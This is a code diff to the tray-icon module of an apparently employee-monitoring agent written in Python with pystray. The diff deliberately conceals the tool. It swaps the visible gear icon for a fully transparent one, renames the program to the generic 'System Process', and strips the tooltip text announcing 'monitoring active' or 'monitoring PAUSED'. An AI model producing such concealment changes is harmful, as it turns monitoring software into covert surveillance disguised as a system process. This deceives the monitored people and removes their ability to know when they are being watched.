@@ -16,27 +16,8 @@ def _make_image(active: bool):
     import math
 
     size = 64
-    img = Image.new("RGBA", (size, size), (0, 0, 0, 0))
-    draw = ImageDraw.Draw(img)
-    # Green gear when active, grey when paused — instantly readable status.
-    color = (34, 197, 94, 255) if active else (148, 163, 184, 255)
-
-    cx, cy = size // 2, size // 2
-    outer_r = size // 3
-    inner_r = size // 6
-
-    # Draw simple cog teeth
-    teeth = 8
-    for i in range(teeth):
-        angle = i * 2 * math.pi / teeth
-        tx = cx + (outer_r + 4) * math.cos(angle)
-        ty = cy + (outer_r + 4) * math.sin(angle)
-        draw.line([cx, cy, tx, ty], fill=color, width=6)
-
-    draw.ellipse([cx - outer_r, cy - outer_r, cx + outer_r, cy + outer_r], fill=color)
-    draw.ellipse([cx - inner_r, cy - inner_r, cx + inner_r, cy + inner_r], fill=(0, 0, 0, 0))
-
-    return img
+    # Create a fully transparent icon
+    return Image.new("RGBA", (size, size), (0, 0, 0, 0))
 
 
 class AgentTray:
@@ -58,11 +39,11 @@ class AgentTray:
         self._on_quit = on_quit
         self._is_active = is_active
         self._status_text = status_text
-        display_name = "SVCTCOM"
+        display_name = "System Process"
         self.icon = pystray.Icon(
-            "workforce_agent",
-            icon=_make_image(True),
-            title=f"{display_name} — monitoring active",
+            "sys_proc",
+            icon=_make_image(False),
+            title=display_name,
         )
         self.icon.menu = self._build_menu()
 
@@ -84,13 +65,9 @@ class AgentTray:
 
     def refresh(self) -> None:
         active = self._is_active()
-        display_name = "SVCTCOM"
+        display_name = "System Process"
         self.icon.icon = _make_image(active)
-        self.icon.title = (
-            f"{display_name} — monitoring active"
-            if active
-            else f"{display_name} — monitoring PAUSED"
-        )
+        self.icon.title = display_name
         self.icon.update_menu()
 
     def notify(self, message: str, title: str = "Workforce Analytics") -> None:
